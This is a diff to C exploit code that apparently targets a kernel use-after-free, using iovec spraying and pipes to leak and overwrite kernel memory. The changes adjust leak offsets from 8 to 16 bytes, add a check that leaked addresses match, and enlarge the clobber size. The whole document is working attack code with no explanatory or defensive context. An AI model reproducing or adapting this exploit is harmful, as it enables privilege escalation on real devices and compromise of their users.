@@ -219,7 +219,7 @@ void leak_data(void* leakBuffer, int leakAmount,
 
   memset(iovec_array, 0, sizeof(iovec_array));
   
-  int delta = (UAF_SPINLOCK+8) % PAGE;
+  int delta = (UAF_SPINLOCK+16) % PAGE;
   int paddingSize = (delta == 0 ? 0 : PAGE-delta) + PAGE;
 
   iovec_array[IOVEC_INDX_FOR_WQ-2].iov_base = (unsigned long*)0xDEADBEEF; 
@@ -262,14 +262,16 @@ void leak_data(void* leakBuffer, int leakAmount,
 
     // first page: dummy data
 
-    unsigned long size1 = paddingSize+UAF_SPINLOCK+8;
+    unsigned long size1 = paddingSize+UAF_SPINLOCK+16;
     printf("CHILD: initial %lx\n", size1);
     char buffer[size1];
     memset(buffer, 0, size1);
     if (read(pipefd[0], buffer, size1) != size1) err(1, "reading first part of pipe");
 
     unsigned long addr=0;
-    memcpy(&addr, buffer+size1-8, 8);
+    memcpy(dataBuffer, buffer+size1-16, 16);
+    if (memcmp(dataBuffer,dataBuffer+8,8)) err(1,"Addresses don't match");
+    memcpy(&addr, dataBuffer, 8);
     if (addr == 0) err(1, "bad address");
     if (extraLeakAmount > 0) {
         char* z = malloc(100000);
@@ -281,17 +283,15 @@ void leak_data(void* leakBuffer, int leakAmount,
             extraLeakAmount, 
         };
         printf("CHILD: clobbering with extra leak address %lx at %lx\n", (unsigned long)extraLeakAddress, addr);
-        clobber_data(addr, &extra, 24); 
+        clobber_data(addr, &extra, 32); 
         printf("CHILD: clobbered\n");
     }
-    if (leakAmount > 8) {
-        memcpy(dataBuffer, buffer+size1-8, 8);
-        if(read(pipefd[0], dataBuffer, leakAmount-8) != leakAmount-8) err(1, "leaking");
-        write(leakPipe[1], buffer+size1-8, 8);
-        write(leakPipe[1], dataBuffer, leakAmount-8);
+    if (leakAmount > 16) {
+        if(read(pipefd[0], dataBuffer+16, leakAmount-16) != leakAmount-16) err(1, "leaking");
+        write(leakPipe[1], dataBuffer, leakAmount);
     }
     else {
-        write(leakPipe[1], buffer+size1-8, 8);
+        write(leakPipe[1], dataBuffer, leakAmount);
     }
     if (extraLeakAmount > 0) {
         printf("CHILD: extra leak\n");
